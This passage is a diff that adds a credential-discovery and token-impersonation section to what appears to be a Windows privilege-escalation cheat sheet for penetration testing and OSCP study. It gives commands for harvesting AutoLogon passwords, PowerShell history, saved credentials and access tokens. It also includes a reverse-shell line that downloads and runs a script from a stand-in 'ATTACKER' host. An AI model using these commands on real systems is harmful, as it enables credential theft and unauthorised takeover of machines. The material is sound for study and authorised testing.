@@ -311,6 +311,68 @@ Akagi64.exe 33 "C:\Windows\Temp\rev.exe"
 
 ---
 
+## 7. Additional Credential Discovery & Token Techniques
+
+### 7a. AutoLogon Registry Credentials
+```cmd
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"
+```
+If `DefaultPassword` has a value and `AutoAdminLogon` is `1`, those are cleartext credentials — try them with `runas` or nxc.
+
+### 7b. PowerShell History & Transcripts
+```cmd
+:: PSReadLine history (PowerShell 5.0+ / Win10+, captures all typed commands including passwords)
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+:: or from PowerShell:
+Get-Content (Get-PSReadLineOption).HistorySavePath
+
+:: Search for transcript logs (if Start-Transcript is enabled via GPO)
+dir /s /b C:\Transcripts\*.txt 2>nul
+dir /s /b C:\Users\*\Documents\PowerShell_transcript*.txt 2>nul
+```
+Look for inline passwords (`-Password`, `ConvertTo-SecureString`, `PSCredential`), connection strings, and API keys.
+
+### 7c. RunAs with Known Credentials
+When you've found credentials (config file, history, registry) for a privileged user, spawn a shell as them:
+```cmd
+:: Interactive (requires GUI/RDP session — prompts for password)
+runas /user:DOMAIN\admin cmd.exe
+
+:: Non-interactive with PowerShell (works from any shell)
+$pass = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\admin', $pass)
+Start-Process cmd.exe -Credential $cred
+:: or for a reverse shell:
+Start-Process powershell.exe -Credential $cred -ArgumentList '-c IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")'
+```
+
+### 7d. Saved Credentials (cmdkey + runas /savecred)
+```cmd
+:: Check for stored credentials
+cmdkey /list
+
+:: If credentials are saved for a privileged user (e.g., "Target: Domain:admin"):
+runas /savecred /user:DOMAIN\admin cmd.exe
+:: /savecred reuses the stored credential without prompting — instant elevated shell
+```
+
+### 7e. Token Impersonation with Incognito
+**Explanation:** On multi-user systems, other logged-in users' access tokens persist in memory. Incognito (Meterpreter built-in, or standalone) can list and impersonate these tokens — if a Domain Admin has an active session on a host you've compromised, their token is stealable.
+```cmd
+:: Standalone Incognito (from a SYSTEM or SeImpersonate shell)
+incognito.exe list_tokens -u                          :: list available delegation/impersonation tokens
+incognito.exe execute -c "DOMAIN\admin" cmd.exe       :: impersonate and spawn a shell
+```
+```bash
+# Meterpreter (lab/HTB only — OSCP single-target restriction)
+load incognito
+list_tokens -u
+impersonate_token "DOMAIN\\admin"
+```
+**Requirements:** `SeImpersonatePrivilege` or SYSTEM; target user must have an active logon session (delegation token) or recently authenticated (impersonation token). Tokens survive logoff for delegation type until the system clears them.
+
+---
+
 ## Tools Reference
 
 | Name | URL |
